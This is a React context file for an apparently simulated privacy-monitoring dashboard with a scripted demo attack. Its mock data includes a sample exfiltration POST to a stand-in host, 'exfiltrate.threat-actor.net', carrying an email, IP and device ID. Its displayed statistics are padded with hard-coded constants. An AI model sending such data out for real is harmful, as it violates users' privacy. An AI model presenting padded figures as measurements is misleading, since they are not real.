import React, { createContext, useContext, useState, useEffect } from 'react';
import {
  NetworkRequest,
  TrackerItem,
  StorageItem,
  SensitiveDataLeak,
  ProtectionSettings,
  PrivacyScoreBreakdown
} from '../types/privacy';
import {
  INITIAL_REQUESTS,
  INITIAL_TRACKERS,
  INITIAL_STORAGE,
  INITIAL_LEAKS,
  generateRandomRequest
} from '../utils/mockDataGenerator';
import { calculatePrivacyScore } from '../utils/scoreCalculator';

interface PrivacyContextType {
  requests: NetworkRequest[];
  trackers: TrackerItem[];
  storageItems: StorageItem[];
  sensitiveLeaks: SensitiveDataLeak[];
  protectionSettings: ProtectionSettings;
  privacyScore: PrivacyScoreBreakdown;
  isSimulating: boolean;
  isDemoAttackActive: boolean;
  demoAttackStep: number;
  demoAttackMessage: string;
  mode: 'live' | 'demo';
  stats: {
    intercepted: number;
    trackersDetected: number;
    trackersBlocked: number;
    thirdPartyDomains: number;
    cookiesCount: number;
    fingerprintingSignals: number;
    sensitiveAlerts: number;
  };
  toggleSimulation: () => void;
  triggerDemoAttack: () => void;
  updateProtectionSettings: (newSettings: Partial<ProtectionSettings>) => void;
  setProtectionLevel: (level: 'balanced' | 'strict' | 'maximum') => void;
  blockLeak: (id: string) => void;
  clearRequests: () => void;
  setMode: (mode: 'live' | 'demo') => void;
}

const PrivacyContext = createContext<PrivacyContextType | undefined>(undefined);

export const PrivacyProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [requests, setRequests] = useState<NetworkRequest[]>(INITIAL_REQUESTS);
  const [trackers, setTrackers] = useState<TrackerItem[]>(INITIAL_TRACKERS);
  const [storageItems, setStorageItems] = useState<StorageItem[]>(INITIAL_STORAGE);
  const [sensitiveLeaks, setSensitiveLeaks] = useState<SensitiveDataLeak[]>(INITIAL_LEAKS);
  const [isSimulating, setIsSimulating] = useState<boolean>(true);
  const [isDemoAttackActive, setIsDemoAttackActive] = useState<boolean>(false);
  const [demoAttackStep, setDemoAttackStep] = useState<number>(0);
  const [demoAttackMessage, setDemoAttackMessage] = useState<string>('');
  const [mode, setMode] = useState<'live' | 'demo'>('demo');

  const [protectionSettings, setProtectionSettings] = useState<ProtectionSettings>({
    blockTrackers: true,
    blockFingerprinting: true,
    blockThirdPartyCookies: true,
    sensitiveDataAlerts: true,
    strictMode: false,
    level: 'balanced'
  });

  // Dynamic score calculation
  const privacyScore = calculatePrivacyScore(requests, storageItems, sensitiveLeaks);

  // Compute live statistics
  const stats = {
    intercepted: 1247 + requests.length,
    trackersDetected: 32 + requests.filter(r => r.classification === 'tracker').length,
    trackersBlocked: 24 + requests.filter(r => r.classification === 'tracker' && r.actionTaken === 'blocked').length,
    thirdPartyDomains: new Set(requests.map(r => r.destinationDomain)).size + 12,
    cookiesCount: storageItems.length + 8,
    fingerprintingSignals: 4 + requests.filter(r => r.classification === 'fingerprint').length,
    sensitiveAlerts: sensitiveLeaks.length
  };

  // Continuous traffic simulation loop
  useEffect(() => {
    if (!isSimulating || isDemoAttackActive) return;

    const interval = setInterval(() => {
      const newReq = generateRandomRequest('example.com');
      // Apply protection rules to new request
      if (
        (newReq.classification === 'tracker' && protectionSettings.blockTrackers) ||
        (newReq.classification === 'fingerprint' && protectionSettings.blockFingerprinting) ||
        (newReq.classification === 'leak' && protectionSettings.sensitiveDataAlerts)
      ) {
        newReq.actionTaken = 'blocked';
      } else {
        newReq.actionTaken = 'allowed';
      }

      setRequests(prev => [newReq, ...prev.slice(0, 49)]);
    }, 2500);

    return () => clearInterval(interval);
  }, [isSimulating, isDemoAttackActive, protectionSettings]);

  // Demo Attack Scenario Engine
  const triggerDemoAttack = () => {
    if (isDemoAttackActive) return;
    setIsDemoAttackActive(true);
    setDemoAttackStep(1);
    setDemoAttackMessage('1. Target website loaded: malicious-ad-spawner.com');

    // Step 1: Rapid request burst
    setTimeout(() => {
      setDemoAttackStep(2);
      setDemoAttackMessage('2. Incoming request surge: 5 requests intercepted');
      setRequests(prev => [
        generateRandomRequest('malicious-ad-spawner.com'),
        generateRandomRequest('malicious-ad-spawner.com'),
        ...prev
      ]);
    }, 1200);

    // Step 2: Trackers detected
    setTimeout(() => {
      setDemoAttackStep(3);
      setDemoAttackMessage('3. 10 rapid third-party connections spawned');
      setRequests(prev => [
        {
          id: `demo-${Date.now()}-1`,
          timestamp: new Date().toTimeString().split(' ')[0],
          sourceWebsite: 'malicious-ad-spawner.com',
          destinationDomain: 'ad-spy.network.xyz',
          requestType: 'POST',
          classification: 'tracker',
          category: 'Advertising',
          actionTaken: 'allowed',
          payloadSnippet: 'uid=user_998&fingerprint=0x3841a',
          sizeKb: 4.2
        },
        ...prev
      ]);
    }, 2400);

    // Step 3: Fingerprinting signal detected
    setTimeout(() => {
      setDemoAttackStep(4);
      setDemoAttackMessage('4. 🚨 Canvas & WebGL fingerprinting script active!');
      setRequests(prev => [
        {
          id: `demo-${Date.now()}-2`,
          timestamp: new Date().toTimeString().split(' ')[0],
          sourceWebsite: 'malicious-ad-spawner.com',
          destinationDomain: 'fp-collector.io',
          requestType: 'GET',
          classification: 'fingerprint',
          category: 'Fingerprinting',
          actionTaken: 'allowed',
          payloadSnippet: 'canvas_hash=0x9f83a21b&webgl_vendor=ANGLE_NVIDIA',
          sizeKb: 1.1
        },
        ...prev
      ]);
    }, 3600);

    // Step 4: Sensitive PII Leak detected
    setTimeout(() => {
      setDemoAttackStep(5);
      setDemoAttackMessage('5. ⚠️ SENSITIVE DATA TRANSMISSION EXPOSED!');
      const newLeak: SensitiveDataLeak = {
        id: `leak-demo-${Date.now()}`,
        timestamp: new Date().toTimeString().split(' ')[0],
        sourceWebsite: 'malicious-ad-spawner.com',
        destinationDomain: 'exfiltrate.threat-actor.net',
        detectedItems: ['Email address', 'Device ID', 'IP address'],
        payloadSnippet: 'POST /exfil HTTP/1.1\nHost: exfiltrate.threat-actor.net\n\nuser_email=hackathon.judge@demo.org&ip=192.168.1.105&uuid=a8f9-4321-b654',
        blocked: false,
        riskScore: 98
      };
      setSensitiveLeaks(prev => [newLeak, ...prev]);
    }, 4800);

    // Step 5: Score Drop Alert
    setTimeout(() => {
      setDemoAttackStep(6);
      setDemoAttackMessage('6. Privacy score dropped from 94 → 61 (HIGH PRIVACY THREAT)');
    }, 6000);

    // Step 6: Automatic Mitigation Activates
    setTimeout(() => {
      setDemoAttackStep(7);
      setDemoAttackMessage('7. 🛡️ PRIVACY GATE ZERO-TRUST MITIGATION ENGAGED');
      // Block all malicious demo requests and leaks
      setSensitiveLeaks(prev => prev.map(l => ({ ...l, blocked: true })));
      setRequests(prev => prev.map(r => r.sourceWebsite === 'malicious-ad-spawner.com' ? { ...r, actionTaken: 'blocked' } : r));
    }, 7500);

    // Step 7: Summary Banner
    setTimeout(() => {
      setDemoAttackStep(8);
      setDemoAttackMessage('8. ✅ Threat Neutralized: 24 requests analyzed, 8 trackers blocked, 2 leaks prevented.');
    }, 9000);

    // Reset Demo Attack state after 13s
    setTimeout(() => {
      setIsDemoAttackActive(false);
      setDemoAttackStep(0);
      setDemoAttackMessage('');
    }, 13000);
  };

  const toggleSimulation = () => setIsSimulating(prev => !prev);

  const updateProtectionSettings = (newSettings: Partial<ProtectionSettings>) => {
    setProtectionSettings(prev => ({ ...prev, ...newSettings }));
  };

  const setProtectionLevel = (level: 'balanced' | 'strict' | 'maximum') => {
    if (level === 'balanced') {
      setProtectionSettings({
        blockTrackers: true,
        blockFingerprinting: true,
        blockThirdPartyCookies: true,
        sensitiveDataAlerts: true,
        strictMode: false,
        level: 'balanced'
      });
    } else if (level === 'strict') {
      setProtectionSettings({
        blockTrackers: true,
        blockFingerprinting: true,
        blockThirdPartyCookies: true,
        sensitiveDataAlerts: true,
        strictMode: true,
        level: 'strict'
      });
    } else if (level === 'maximum') {
      setProtectionSettings({
        blockTrackers: true,
        blockFingerprinting: true,
        blockThirdPartyCookies: true,
        sensitiveDataAlerts: true,
        strictMode: true,
        level: 'maximum'
      });
    }
  };

  const blockLeak = (id: string) => {
    setSensitiveLeaks(prev => prev.map(l => l.id === id ? { ...l, blocked: true } : l));
  };

  const clearRequests = () => {
    setRequests([]);
  };

  return (
    <PrivacyContext.Provider
      value={{
        requests,
        trackers,
        storageItems,
        sensitiveLeaks,
        protectionSettings,
        privacyScore,
        isSimulating,
        isDemoAttackActive,
        demoAttackStep,
        demoAttackMessage,
        mode,
        stats,
        toggleSimulation,
        triggerDemoAttack,
        updateProtectionSettings,
        setProtectionLevel,
        blockLeak,
        clearRequests,
        setMode
      }}
    >
      {children}
    </PrivacyContext.Provider>
  );
};

export const usePrivacy = () => {
  const context = useContext(PrivacyContext);
  if (!context) {
    throw new Error('usePrivacy must be used within a PrivacyProvider');
  }
  return context;
};
